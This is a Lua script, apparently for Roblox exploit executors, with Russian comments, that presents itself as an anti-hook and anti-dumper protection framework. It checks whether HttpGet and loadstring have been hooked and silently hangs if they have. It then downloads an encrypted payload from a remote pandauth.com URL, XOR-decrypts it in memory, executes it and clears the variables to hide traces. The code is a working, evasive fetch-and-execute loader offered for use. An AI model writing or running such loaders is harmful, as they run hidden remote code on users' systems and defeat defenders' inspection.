-- =========================================================
--  FULL ANTI-HOOK & ANTI-DUMPER PROTECTION FRAMEWORK
-- =========================================================

-- 1. Кэширование оригинальных функций до исполнения сторонних скриптов
local rawHttpGet     = game.HttpGet
local rawLoadstring  = loadstring
local cancelThread   = task.cancel
local currentThread  = task.current
local pcallRef       = pcall
local typeRef        = type
local charRef        = string.char
local byteRef        = string.byte
local bxorRef        = bit32 and bit32.bxor or function(a, b) return a end

-- 2. Бесшумное аварийное завершение (Защита от Anti-Kick)
local function silentCrash()
    if cancelThread and currentThread then
        pcallRef(cancelThread, currentThread())
    end
    while true do end
end

-- 3. Глубокая детекция хуков и подмен
local function isHooked(fn)
    if typeRef(fn) ~= "function" then return true end
    
    -- Проверка: C-функция подменена на Lua-замыкание
    if islclosure and islclosure(fn) then
        return true
    end
    
    -- Проверка флагов эксплойта
    if isfunctionhooked and isfunctionhooked(fn) then
        return true
    end
    
    -- Проверка метаданных функции
    if debug and debug.getinfo then
        local success, info = pcallRef(debug.getinfo, fn)
        if not success or info.what ~= "C" or info.source ~= "=[C]" then
            return true
        end
    end
    
    return false
end

-- Валидация жизненно важных функций
if isHooked(rawHttpGet) or isHooked(rawLoadstring) then
    silentCrash()
end

-- 4. Расшифровка полезной нагрузки прямо в ОЗУ
local function decryptPayload(encryptedData, key)
    local result = {}
    local keyLen = #key
    for i = 1, #encryptedData do
        local b = byteRef(encryptedData, i)
        local kb = byteRef(key, (i - 1) % keyLen + 1)
        result[i] = charRef(bxorRef(b, kb))
    end
    return table.concat(result)
end

-- 5. Безопасный загрузчик
local function safeExecute(payloadUrl, secretKey)
    -- Прямой вызов обходит __namecall дамперы
    local success, response = pcallRef(rawHttpGet, game, payloadUrl)
    
    if not success or typeRef(response) ~= "string" or #response == 0 then
        silentCrash()
    end
    
    -- Дампер получает только зашифрованную строку
    local decryptedCode = decryptPayload(response, secretKey)
    
    local loadedFunc, err = rawLoadstring(decryptedCode)
    if not loadedFunc then
        silentCrash()
    end
    
    -- Затирание следов в памяти
    decryptedCode = nil
    response = nil
    
    return loadedFunc()
end

-- Запуск (Укажите зашифрованный URL и ваш секретный ключ)
safeExecute("https://vss.pandauth.com/kv/28d03ee94222730a", "123")
